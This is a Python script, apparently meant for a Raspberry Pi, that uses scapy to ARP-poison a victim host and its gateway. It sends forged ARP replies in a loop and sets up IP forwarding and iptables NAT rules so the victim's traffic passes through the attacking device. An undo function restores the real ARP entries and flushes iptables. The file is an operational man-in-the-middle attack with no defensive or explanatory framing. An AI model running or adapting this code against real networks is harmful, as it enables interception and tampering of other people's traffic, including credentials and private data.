from scapy.all import *
import time
import sys
import signal
import netifaces
import subprocess

iface = "wlan1"

def get_rpi_ip():
    try:
        ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]["addr"]
    except (ValueError, KeyError):
        return None
    return ip

def mac_from_ip(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=5, iface=iface, verbose=False)
    for sent, recv in ans:
        if recv.psrc == ip:
            return recv.hwsrc
    return None

def enable_ip_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

def setup_iptables(victim_iface="wlan0", internet_iface="wlan1"):
    subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", internet_iface, "-j", "MASQUERADE"])
    subprocess.run(["iptables", "-A", "FORWARD", "-i", internet_iface, "-o", victim_iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
    subprocess.run(["iptables", "-A", "FORWARD", "-i", victim_iface, "-o", internet_iface, "-j", "ACCEPT"])

def cleanup_iptables():
    subprocess.run(["iptables", "--flush"])
    subprocess.run(["iptables", "-t", "nat", "--flush"])
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"])

def arp_poison(host, gateway):
    try: 
        print(host, " ", gateway, ' ', get_rpi_ip())
        attacker_mac = get_if_hwaddr(iface)
        host_mac = mac_from_ip(host)
        gateway_mac = mac_from_ip(gateway)

        cleanup_iptables()
        enable_ip_forwarding()
        setup_iptables()

        print(attacker_mac, ' ', host_mac, ' ', gateway_mac)

        packet = ARP(op=2, psrc=gateway, pdst=host, hwsrc=attacker_mac, hwdst=host_mac)

        for i in range(10):
            send(packet, iface=iface, verbose=False)

            send(ARP(op=2, psrc=host, pdst=gateway, hwsrc=attacker_mac, hwdst=gateway_mac), iface=iface, verbose=False)

            time.sleep(2)
            print("Done")
        return True
    except Exception as e:
        return False

def undo_arp_poison(host, gateway):
    try:
        host_mac = mac_from_ip(host)
        gateway_mac = mac_from_ip(gateway)

        packet = ARP(op=2, psrc=gateway, pdst=host, hwsrc=gateway_mac, hwdst=host_mac)
        send(packet, iface=iface, verbose=False)

        send(ARP(op=2, psrc=host, pdst=gateway, hwsrc=host_mac, hwdst=gateway_mac), iface=iface, verbose=False)

        cleanup_iptables()

        return True
    except Exception as e:
        return False